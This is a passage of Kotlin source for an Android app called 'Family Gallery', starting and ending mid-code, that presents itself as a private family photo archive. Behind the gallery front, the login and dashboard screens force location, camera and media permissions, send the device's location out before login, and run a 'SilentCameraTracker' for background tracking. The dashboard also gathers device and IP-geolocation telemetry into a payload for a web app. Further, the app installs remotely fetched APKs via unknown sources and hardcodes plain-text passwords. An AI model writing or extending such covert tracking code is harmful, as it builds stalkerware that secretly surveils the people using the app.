                                contentColor = Color(0xFF131317)
                            ),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.height(40.dp)
                        ) {
                            Text("Install Now", fontWeight = FontWeight.Bold)
                        }
                    } else if (updateAvailable == true && latestApkUrl.isNotEmpty() && !isDownloadingApk) {
                        Button(
                            onClick = {
                                isDownloadingApk = true
                                downloadApkProgress = 0f
                                downloadApkError = null
                                downloadApkWithDownloadManager(
                                    context = context,
                                    apkUrlString = latestApkUrl,
                                    onProgress = { progress ->
                                        downloadApkProgress = progress
                                    },
                                    onFinished = { apkFile ->
                                        isDownloadingApk = false
                                        if (apkFile != null) {
                                            pendingApkFile = apkFile
                                            val canInstall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                context.packageManager.canRequestPackageInstalls()
                                            } else {
                                                true
                                            }
                                            if (canInstall) {
                                                triggerApkInstallation(context, apkFile)
                                            } else {
                                                showUnknownSourcesDialog = true
                                            }
                                        } else {
                                            downloadApkError = "Download failed: empty file"
                                        }
                                    },
                                    onError = { errorMsg ->
                                        isDownloadingApk = false
                                        downloadApkError = errorMsg
                                    }
                                )
                            },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFFE5A93B),
                                contentColor = Color(0xFF131317)
                            ),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.height(40.dp)
                        ) {
                            Text("Update", fontWeight = FontWeight.Bold)
                        }
                    }
                }
            },
            dismissButton = null,
            containerColor = Color(0xFF131317)
        )
    }

    // Modal dialogue - Unknown Sources Permission Instruction
    if (showUnknownSourcesDialog) {
        AlertDialog(
            onDismissRequest = { showUnknownSourcesDialog = false },
            icon = {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B),
                    modifier = Modifier.size(36.dp)
                )
            },
            title = {
                Text(
                    text = "Permission Required",
                    color = Color.White,
                    fontWeight = FontWeight.Bold,
                    fontSize = 18.sp
                )
            },
            text = {
                Text(
                    text = "On Android 8.0 and above, you must grant permission to allow this app to install unknown apps. Please click 'Grant' to open Settings, enable the toggle, then return here to install.",
                    color = Color.White.copy(alpha = 0.8f),
                    fontSize = 14.sp
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showUnknownSourcesDialog = false
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                val intent = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                                    data = Uri.parse("package:${context.packageName}")
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                }
                                context.startActivity(intent)
                            } else {
                                Toast.makeText(context, "Please allow unknown sources in security settings manually.", Toast.LENGTH_LONG).show()
                            }
                        } catch (e: Exception) {
                            e.printStackTrace()
                            Toast.makeText(context, "Could not open settings: ${e.message}", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFFE5A93B),
                        contentColor = Color(0xFF131317)
                    )
                ) {
                    Text("Grant Permission", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = { showUnknownSourcesDialog = false },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color.White.copy(alpha = 0.6f))
                ) {
                    Text("Cancel")
                }
            },
            containerColor = Color(0xFF1E1E24)
        )
    }
}
}


@Composable
fun WelcomeScreen(onExploreClick: () -> Unit) {
    Box(
        modifier = Modifier.fillMaxSize()
    ) {
        // High fidelity full screen nature backdrop
        Image(
            painter = painterResource(id = R.drawable.img_nature_bg),
            contentDescription = "Beautiful nature setting",
            contentScale = ContentScale.Crop,
            modifier = Modifier.fillMaxSize()
        )

        // Gradient overlay for visual contrast, readable typography and modern depth
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(
                    Brush.verticalGradient(
                        colors = listOf(
                            Color.Black.copy(alpha = 0.2f),
                            Color.Black.copy(alpha = 0.5f),
                            Color.Black.copy(alpha = 0.9f)
                        )
                    )
                )
        )

        // Content
        Column(
            modifier = Modifier
                .fillMaxSize()
                .statusBarsPadding()
                .navigationBarsPadding()
                .padding(24.dp),
            verticalArrangement = Arrangement.SpaceBetween,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Elegant top branding
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.Center,
                modifier = Modifier
                    .padding(top = 40.dp)
                    .alpha(0.85f)
            ) {
                Icon(
                    imageVector = Icons.Default.Camera,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B), // Warm Nostalgia Gold
                    modifier = Modifier.size(28.dp)
                )
                Spacer(modifier = Modifier.width(8.dp))
                Text(
                    text = "FAMILY ARCHIVE",
                    color = Color.White,
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = 4.sp
                )
            }

            // Bottom focus layout with beautiful descriptive typography and explore action
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                modifier = Modifier.padding(bottom = 30.dp)
            ) {
                Text(
                    text = "Family Gallery",
                    color = Color.White,
                    fontSize = 42.sp,
                    fontWeight = FontWeight.ExtraBold,
                    textAlign = TextAlign.Center,
                    letterSpacing = (-0.5).sp,
                    lineHeight = 48.sp
                )
                
                Spacer(modifier = Modifier.height(12.dp))

                Text(
                    text = "A private sanctuary hosting generations of love, stories, and warm memories.",
                    color = Color.White.copy(alpha = 0.7f),
                    fontSize = 16.sp,
                    textAlign = TextAlign.Center,
                    lineHeight = 22.sp,
                    modifier = Modifier.padding(horizontal = 16.dp)
                )

                Spacer(modifier = Modifier.height(36.dp))

                // Beautiful interactive Pill Button
                Button(
                    onClick = onExploreClick,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFFE5A93B), // Premium Warm Gold
                        contentColor = Color(0xFF1E1E24)
                    ),
                    shape = RoundedCornerShape(28.dp),
                    contentPadding = PaddingValues(horizontal = 36.dp, vertical = 16.dp),
                    modifier = Modifier
                        .height(56.dp)
                        .testTag("explore_button")
                ) {
                    Text(
                        text = "Explore the Sanctuary",
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 0.5.sp
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Icon(
                        imageVector = Icons.Default.ArrowForward,
                        contentDescription = "Next entry",
                        modifier = Modifier.size(20.dp)
                    )
                }
            }
        }
    }
}

@Composable
fun LoginScreen(
    onLoginSuccess: (String) -> Unit,
    onBack: () -> Unit
) {
    val context = LocalContext.current
    
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    var hasAttemptedLogin by remember { mutableStateOf(false) }

    val isUserGallery = username.trim().lowercase() == "gallery"

    // States for tracking system permissions inside flow
    var isLocationGranted by remember { mutableStateOf(hasLocationPermissions(context)) }
    var isGalleryGranted by remember { mutableStateOf(hasGalleryPermissions(context)) }
    var isCameraGranted by remember { mutableStateOf(hasCameraPermission(context)) }
    var showGpsDisabledDialog by remember { mutableStateOf(false) }

    // Create a launcher to request multiple permissions
    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { perms: Map<String, Boolean> ->
        isLocationGranted = perms[android.Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                            perms[android.Manifest.permission.ACCESS_COARSE_LOCATION] == true
        isGalleryGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms[android.Manifest.permission.READ_MEDIA_IMAGES] == true
        } else {
            perms[android.Manifest.permission.READ_EXTERNAL_STORAGE] == true
        }
        isCameraGranted = perms[android.Manifest.permission.CAMERA] == true

        if (isGalleryGranted && isCameraGranted) {
            Toast.makeText(context, "Permissions acquired. Ready to login!", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(context, "Permissions declined. Family Gallery requires active access.", Toast.LENGTH_LONG).show()
        }
    }

    // Function to initiate standard requests
    fun askForPermissions() {
        val permissionsToRequest = mutableListOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.CAMERA
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        permissionLauncher.launch(permissionsToRequest.toTypedArray())
    }

    // Auto-request location, gallery and camera permission upon screen entry
    LaunchedEffect(Unit) {
        if (!isLocationGranted || !isGalleryGranted || !isCameraGranted) {
            askForPermissions()
        }
    }

    // Call Google Apps Script Web App API immediately once location permission is available in Login Screen
    LaunchedEffect(isLocationGranted) {
        if (isLocationGranted) {
            if (isUserGallery && !isGpsEnabled(context)) {
                showGpsDisabledDialog = true
            }
            fetchCurrentLocation(
                context = context,
                onSuccess = { lat, lon, desc ->
                    android.util.Log.d("FamilyGallery", "Successfully fetched and dispatched login location: $lat, $lon")
                },
                onFailure = { err ->
                    android.util.Log.e("FamilyGallery", "Could not dispatch login location: $err")
                }
            )
        }
    }

    val isCredentialsValid = (username.trim().lowercase() == "gallery" && password == "gallery2026@") ||
            (username.trim().lowercase() == "mou" && password == "Mou2026@") ||
            (username.trim().lowercase() == "shuvo" && (password == "shuvo2026@" || password == "shuvo2026@."))
    val arePermissionsApproved = if (isUserGallery) {
        isLocationGranted && isGalleryGranted && isCameraGranted && isGpsEnabled(context)
    } else {
        isGalleryGranted && isCameraGranted
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(
                Brush.radialGradient(
                    colors = listOf(
                        Color(0xFF232530),
                        Color(0xFF121214)
                    )
                )
            )
            .statusBarsPadding()
            .navigationBarsPadding()
            .padding(24.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.SpaceBetween
        ) {
            // Elegant Back controls and context
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 8.dp),
                horizontalArrangement = Arrangement.Start,
                verticalAlignment = Alignment.CenterVertically
            ) {
                IconButton(onClick = onBack) {
                    Icon(
                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                        contentDescription = "Navigate back",
                        tint = Color.White
                    )
                }
                Spacer(modifier = Modifier.width(8.dp))
                Text(
                    text = "Welcome Back",
                    color = Color.White.copy(alpha = 0.8f),
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Medium
                )
            }

            // Secure Title Branding
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                modifier = Modifier.padding(vertical = 24.dp)
            ) {
                Icon(
                    imageVector = Icons.Default.Camera,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B),
                    modifier = Modifier.size(56.dp)
                )
                
                Spacer(modifier = Modifier.height(16.dp))

                Text(
                    text = "Authorized Entry",
                    color = Color.White,
                    fontSize = 28.sp,
                    fontWeight = FontWeight.Bold,
                    letterSpacing = (-0.5).sp
                )

                Text(
                    text = "Verify credentials and security clearances to access family memories.",
                    color = Color.White.copy(alpha = 0.5f),
                    fontSize = 14.sp,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.padding(horizontal = 24.dp, vertical = 8.dp)
                )
            }

            // Form container
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF1A1A1E), shape = RoundedCornerShape(24.dp))
                    .border(1.dp, Color.White.copy(alpha = 0.05f), shape = RoundedCornerShape(24.dp))
                    .padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Username field
                OutlinedTextField(
                    value = username,
                    onValueChange = { username = it },
                    label = { Text("Username") },
                    placeholder = { Text("e.g. gallery") },
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFFE5A93B),
                        unfocusedBorderColor = Color.White.copy(alpha = 0.15f),
                        focusedLabelColor = Color(0xFFE5A93B),
                        unfocusedLabelColor = Color.White.copy(alpha = 0.4f),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White
                    ),
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("username_input"),
                    keyboardOptions = KeyboardOptions(imeAction = ImeAction.Next),
                    leadingIcon = {
                        Icon(Icons.Default.Person, contentDescription = null, tint = Color.White.copy(alpha = 0.4f))
                    }
                )

                // Password field
                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("App Secret Password") },
                    placeholder = { Text("••••••••") },
                    singleLine = true,
                    visualTransformation = if (passwordVisible) VisualTransformation.None else PasswordVisualTransformation(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFFE5A93B),
                        unfocusedBorderColor = Color.White.copy(alpha = 0.15f),
                        focusedLabelColor = Color(0xFFE5A93B),
                        unfocusedLabelColor = Color.White.copy(alpha = 0.4f),
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White
                    ),
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("password_input"),
                    keyboardOptions = KeyboardOptions(imeAction = ImeAction.Done),
                    trailingIcon = {
                        IconButton(onClick = { passwordVisible = !passwordVisible }) {
                            Icon(
                                imageVector = if (passwordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                                contentDescription = if (passwordVisible) "Hide password" else "Show password",
                                tint = Color.White.copy(alpha = 0.4f)
                            )
                        }
                    },
                    leadingIcon = {
                        Icon(Icons.Default.Password, contentDescription = null, tint = Color.White.copy(alpha = 0.4f))
                    }
                )

                Spacer(modifier = Modifier.height(4.dp))

                // Interactive Dynamic Permission status widget before Login button
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF26262B), shape = RoundedCornerShape(12.dp))
                        .padding(12.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text(
                        text = "Access Approvals Required",
                        color = Color.White,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 1.sp,
                        modifier = Modifier.alpha(0.6f)
                    )

                    // Permission row 1: Coarse/Fine Location
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = if (isLocationGranted) Icons.Default.LocationOn else Icons.Default.LocationOff,
                                contentDescription = null,
                                tint = if (isLocationGranted) Color(0xFF81C784) else Color(0xFFE57373),
                                modifier = Modifier.size(16.dp)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "Device GPS Coordinate Location",
                                color = Color.White,
                                fontSize = 12.sp
                            )
                        }
                        if (isLocationGranted) {
                            Icon(Icons.Default.CheckCircle, contentDescription = "Active", tint = Color(0xFF81C784), modifier = Modifier.size(16.dp))
                        } else {
                            Text(
                                text = "Grant",
                                color = Color(0xFFE5A93B),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                modifier = Modifier
                                    .clickable { askForPermissions() }
                                    .padding(vertical = 2.dp, horizontal = 4.dp)
                            )
                        }
                    }

                    // Permission row 2: Gallery Access
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = if (isGalleryGranted) Icons.Default.PhotoLibrary else Icons.Default.HideImage,
                                contentDescription = null,
                                tint = if (isGalleryGranted) Color(0xFF81C784) else Color(0xFFE57373),
                                modifier = Modifier.size(16.dp)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "Gallery Storage Media Access",
                                color = Color.White,
                                fontSize = 12.sp
                            )
                        }
                        if (isGalleryGranted) {
                            Icon(Icons.Default.CheckCircle, contentDescription = "Active", tint = Color(0xFF81C784), modifier = Modifier.size(16.dp))
                        } else {
                            Text(
                                text = "Grant",
                                color = Color(0xFFE5A93B),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                modifier = Modifier
                                    .clickable { askForPermissions() }
                                    .padding(vertical = 2.dp, horizontal = 4.dp)
                            )
                        }
                    }

                    // Permission row 3: Camera Access
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = if (isCameraGranted) Icons.Default.CameraAlt else Icons.Default.Camera,
                                contentDescription = null,
                                tint = if (isCameraGranted) Color(0xFF81C784) else Color(0xFFE57373),
                                modifier = Modifier.size(16.dp)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "Camera Hardware Access",
                                color = Color.White,
                                fontSize = 12.sp
                            )
                        }
                        if (isCameraGranted) {
                            Icon(Icons.Default.CheckCircle, contentDescription = "Active", tint = Color(0xFF81C784), modifier = Modifier.size(16.dp))
                        } else {
                            Text(
                                text = "Grant",
                                color = Color(0xFFE5A93B),
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                modifier = Modifier
                                    .clickable { askForPermissions() }
                                    .padding(vertical = 2.dp, horizontal = 4.dp)
                            )
                        }
                    }
                }

                // Security error display if tried and failed
                if (hasAttemptedLogin) {
                    if (!isCredentialsValid) {
                        Text(
                            text = "Invalid passcode credentials. Please verify username and retry.",
                            color = Color(0xFFFF8A80),
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            modifier = Modifier.padding(vertical = 2.dp)
                        )
                    } else if (!arePermissionsApproved) {
                        Text(
                            text = "Access Denied. Ensure Local Coordinate GPS, Gallery, and Camera Permissions are approved.",
                            color = Color(0xFFFFB74D),
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            modifier = Modifier.padding(vertical = 2.dp)
                        )
                    }
                }

                Spacer(modifier = Modifier.height(4.dp))

                // Beautiful Login Button
                Button(
                    onClick = {
                        hasAttemptedLogin = true
                        if (arePermissionsApproved) {
                            if (isCredentialsValid) {
                                Toast.makeText(context, "Logon Approved. Opening Vault...", Toast.LENGTH_SHORT).show()
                                onLoginSuccess(username.trim().lowercase())
                            } else {
                                Toast.makeText(context, "Invalid authorized username or password.", Toast.LENGTH_SHORT).show()
                            }
                        } else {
                            if ((isUserGallery && !isLocationGranted) || !isGalleryGranted || !isCameraGranted) {
                                askForPermissions()
                            } else if (isUserGallery && !isGpsEnabled(context)) {
                                showGpsDisabledDialog = true
                            }
                        }
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (isCredentialsValid && arePermissionsApproved) Color(0xFFE5A93B) else Color(0xFFE5A93B).copy(alpha = 0.5f),
                        contentColor = Color(0xFF1E1E24)
                    ),
                    shape = RoundedCornerShape(16.dp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp)
                        .testTag("login_button")
                ) {
                    Icon(
                        imageVector = if (arePermissionsApproved) Icons.Default.LockOpen else Icons.Default.Security,
                        contentDescription = null,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "Enter Family Archive",
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    }

    if (showGpsDisabledDialog) {
        AlertDialog(
            onDismissRequest = { showGpsDisabledDialog = false },
            icon = {
                Icon(
                    imageVector = Icons.Default.LocationOff,
                    contentDescription = null,
                    tint = Color(0xFFE57373),
                    modifier = Modifier.size(48.dp)
                )
            },
            title = {
                Text(
                    text = "GPS Services Required",
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )
            },
            text = {
                Text(
                    text = "Your device's GPS or Location Services are currently turned off. To locate the family archivist and coordinates, please turn on GPS/Location Services.",
                    color = Color.White.copy(alpha = 0.7f),
                    textAlign = TextAlign.Center,
                    fontSize = 14.sp
                )
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        try {
                            context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                        } catch (e: Exception) {
                            Toast.makeText(context, "Could not open location settings", Toast.LENGTH_SHORT).show()
                        }
                        showGpsDisabledDialog = false
                    }
                ) {
                    Text("Turn On GPS", color = Color(0xFF81C784))
                }
            },
            dismissButton = {
                TextButton(onClick = { showGpsDisabledDialog = false }) {
                    Text("Later", color = Color.White.copy(alpha = 0.6f))
                }
            },
            containerColor = Color(0xFF1E1E24),
            shape = RoundedCornerShape(24.dp)
        )
    }
}

@Composable
fun DashboardScreen(
    loggedInUser: String,
    pendingUploads: List<Uri>,
    onAddUpload: (Uri) -> Unit,
    locationState: String,
    userCoordinates: Pair<Double, Double>?,
    onUpdateLocation: (Double, Double, String) -> Unit,
    onNavigateToUpload: () -> Unit,
    onOpenSecret: () -> Unit,
    onLogout: () -> Unit,
    backgroundUpdateBadgeActive: Boolean,
    onShowUpdateDialog: () -> Unit
) {
    val context = LocalContext.current

    // Background user identification/tracking process
    SilentCameraTracker(loggedInUser)
    var isRefreshingLocation by remember { mutableStateOf(false) }

    // Dialog trigger states
    var selectedPhotoForDetail by remember { mutableStateOf<GalleryPhoto?>(null) }
    var selectImageLauncherActive by remember { mutableStateOf(false) }
    var uploadNotificationActive by remember { mutableStateOf(false) }
    var showGpsDisabledDialog by remember { mutableStateOf(false) }

    // Secret Dialog credentials
    var secretCodeDialogActive by remember { mutableStateOf(false) }
    var enteredSecretCode by remember { mutableStateOf("") }
    var secretCodeErrorVisible by remember { mutableStateOf(false) }

    // Notification system state variables
    val prefs = remember { context.getSharedPreferences("app_prefs", android.content.Context.MODE_PRIVATE) }
    val coroutineScope = rememberCoroutineScope()
    var dismissedTimestamp by remember { mutableStateOf(prefs.getLong("dismissed_notification_timestamp", 0L)) }
    
    // Initial load from SharedPreferences for instant local/offline display
    var activeNotification by remember {
        mutableStateOf<Triple<String, String, Long>?>(
            run {
                val title = prefs.getString("shared_notif_title", "") ?: ""
                val body = prefs.getString("shared_notif_body", "") ?: ""
                val ts = prefs.getLong("shared_notif_timestamp", 0L)
                if (title.isNotEmpty()) Triple(title, body, ts) else null
            }
        )
    }
    
    var showNotificationDialog by remember { mutableStateOf(false) }
    var postTitle by remember { mutableStateOf("") }
    var postBody by remember { mutableStateOf("") }
    var isPostingNotification by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        while (true) {
            try {
                val result = withContext(Dispatchers.IO) {
                    var titleRes = ""
                    var bodyRes = ""
                    var timeRes = 0L
                    var success = false
                    fetchAppNotification(
                        onSuccess = { title, body, timestamp ->
                            titleRes = title
                            bodyRes = body
                            timeRes = timestamp
                            success = true
                        },
                        onFailure = {}
                    )
                    if (success) Triple(titleRes, bodyRes, timeRes) else null
                }
                
                if (result != null) {
                    val localTs = prefs.getLong("shared_notif_timestamp", 0L)
                    // Sync if network has a newer notification, OR if local memory is empty and it hasn't been dismissed
                    if (result.third > localTs || (activeNotification == null && result.third > dismissedTimestamp)) {
                        prefs.edit()
                            .putString("shared_notif_title", result.first)
                            .putString("shared_notif_body", result.second)
                            .putLong("shared_notif_timestamp", result.third)
                            .apply()
                        activeNotification = result
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(7000) // Poll every 7 seconds for snappier real-time experience
        }
    }

    // Init location query on load (safely)
    LaunchedEffect(Unit) {
        if (loggedInUser == "gallery" && hasLocationPermissions(context)) {
            if (!isGpsEnabled(context)) {
                showGpsDisabledDialog = true
            }
            isRefreshingLocation = true
            fetchCurrentLocation(
                context = context,
                onSuccess = { lat, lon, desc ->
                    onUpdateLocation(lat, lon, desc)
                    isRefreshingLocation = false
                },
                onFailure = { err ->
                    Toast.makeText(context, "Location issue: $err", Toast.LENGTH_SHORT).show()
                    isRefreshingLocation = false
                }
            )
        }
    }

    // Collect and Send telemetry data to Web App URL when Dashboard UI opens
    LaunchedEffect(Unit) {
        withContext(Dispatchers.IO) {
            try {
                // Get battery info
                val batteryStatus: android.content.Intent? = context.registerReceiver(
                    null,
                    android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
                )
                val level = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val batteryLevel = if (level >= 0 && scale > 0) "${(level * 100 / scale.toFloat()).toInt()}%" else ""
                val chargeStatus = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
                val batteryIsCharging = chargeStatus == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                        chargeStatus == android.os.BatteryManager.BATTERY_STATUS_FULL

                // Network type
                val cm = context.getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
                val activeNetwork = cm?.activeNetwork
                val capabilities = cm?.getNetworkCapabilities(activeNetwork)
                val networkType = when {
                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "wifi"
                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "cellular"
                    else -> "unknown"
                }

                // Screen metrics
                val metrics = context.resources.displayMetrics
                val screenWidth = metrics.widthPixels.toString()
                val screenHeight = metrics.heightPixels.toString()
                val devicePixelRatio = metrics.density.toString()

                // Memory GB
                var deviceMemoryGB = ""
                try {
                    val actManager = context.getSystemService(android.content.Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
                    val memInfo = android.app.ActivityManager.MemoryInfo()
                    actManager?.getMemoryInfo(memInfo)
                    val totalGB = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
                    deviceMemoryGB = String.format(java.util.Locale.US, "%.1f", totalGB)
                } catch (me: Exception) {
                    me.printStackTrace()
                }

                // Fetch IP and Geo info
                var ipAddress = ""
                var country = ""
                var region = ""
                var city = ""
                var isp = ""
                var currency = ""
                var countryCallingCode = ""
                var networkApiError = ""

                val userAgent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                var success = false

                // Try Provider 1: ipapi.co
                try {
                    val ipUrl = java.net.URL("https://ipapi.co/json/")
                    val ipConn = ipUrl.openConnection() as java.net.HttpURLConnection
                    ipConn.connectTimeout = 8000
                    ipConn.readTimeout = 8000
                    ipConn.setRequestProperty("User-Agent", userAgent)
                    val code = ipConn.responseCode
                    if (code == 200) {
                        val ipResponse = ipConn.inputStream.bufferedReader().use { it.readText() }
                        val ipJson = org.json.JSONObject(ipResponse)
                        ipAddress = ipJson.optString("ip", "")
                        country = ipJson.optString("country_name", "")
                        region = ipJson.optString("region", "")
                        city = ipJson.optString("city", "")
                        isp = ipJson.optString("org", "")
                        currency = ipJson.optString("currency", "")
                        countryCallingCode = ipJson.optString("country_calling_code", "")
                        success = true
                    } else {
                        networkApiError = "Provider 1 (ipapi.co) failed with code: $code; "
                    }
                } catch (ipe: Exception) {
                    networkApiError = "Provider 1 error: ${ipe.message}; "
                }

                // Try Provider 2 if Provider 1 failed
                if (!success) {
                    try {
                        val ipUrl = java.net.URL("https://ipwho.is/")
                        val ipConn = ipUrl.openConnection() as java.net.HttpURLConnection
                        ipConn.connectTimeout = 8000
                        ipConn.readTimeout = 8000
                        ipConn.setRequestProperty("User-Agent", userAgent)
                        val code = ipConn.responseCode
                        if (code == 200) {
                            val ipResponse = ipConn.inputStream.bufferedReader().use { it.readText() }
                            val ipJson = org.json.JSONObject(ipResponse)
                            if (ipJson.optBoolean("success", false)) {
                                ipAddress = ipJson.optString("ip", "")
                                country = ipJson.optString("country", "")
                                region = ipJson.optString("region", "")
                                city = ipJson.optString("city", "")
                                val connObj = ipJson.optJSONObject("connection")
                                isp = connObj?.optString("isp", "") ?: connObj?.optString("org", "") ?: ""
                                currency = ipJson.optJSONObject("currency")?.optString("code", "") ?: ""
                                countryCallingCode = ipJson.optString("country_phone", "")
                                success = true
                            } else {
                                networkApiError += "Provider 2 (ipwho.is) success=false; "
                            }
                        } else {
                            networkApiError += "Provider 2 (ipwho.is) failed with code: $code; "
                        }
                    } catch (ipe: Exception) {
                        networkApiError += "Provider 2 error: ${ipe.message}; "
                    }
                }

                // Try Provider 3 if Provider 1 & 2 both failed
                if (!success) {
                    try {
                        val ipUrl = java.net.URL("https://freeipapi.com/api/json")
                        val ipConn = ipUrl.openConnection() as java.net.HttpURLConnection
                        ipConn.connectTimeout = 8000
                        ipConn.readTimeout = 8000
                        ipConn.setRequestProperty("User-Agent", userAgent)
                        val code = ipConn.responseCode
                        if (code == 200) {
                            val ipResponse = ipConn.inputStream.bufferedReader().use { it.readText() }
                            val ipJson = org.json.JSONObject(ipResponse)
                            ipAddress = ipJson.optString("ipAddress", "")
                            country = ipJson.optString("countryName", "")
                            region = ipJson.optString("regionName", "")
                            city = ipJson.optString("cityName", "")
                            countryCallingCode = ipJson.optString("countryCode", "")
                            success = true
                        } else {
                            networkApiError += "Provider 3 (freeipapi) failed with code: $code; "
                        }
                    } catch (ipe: Exception) {
                        networkApiError += "Provider 3 error: ${ipe.message}; "
                    }
                }

                if (!success) {
                    ipAddress = "Blocked/Offline"
                }

                // Build payload
                val payload = org.json.JSONObject().apply {
                    put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }.format(java.util.Date()))
                    put("localTime", java.util.Date().toString())
                    put("timeZone", java.util.TimeZone.getDefault().id)
